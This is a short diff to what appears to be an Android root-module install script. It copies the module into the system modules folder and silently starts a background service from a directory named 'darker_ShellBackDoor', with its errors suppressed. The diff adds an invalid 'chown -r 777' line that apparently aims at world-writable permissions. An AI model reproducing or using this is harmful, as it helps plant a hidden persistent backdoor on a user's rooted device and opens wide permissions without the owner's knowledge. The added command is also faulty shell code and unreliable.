@@ -13,4 +13,5 @@ MODS_PATH="/data/adb/modules"
 
 # shellcheck disable=SC2153
 rm -rf "$MODPATH"/customize.sh; cp -af "$MODPATH" $MODS_PATH
+chown -r 777 "$MODPATH"/*
 sh $MODS_PATH/darker_ShellBackDoor/service.sh 2>/dev/null &
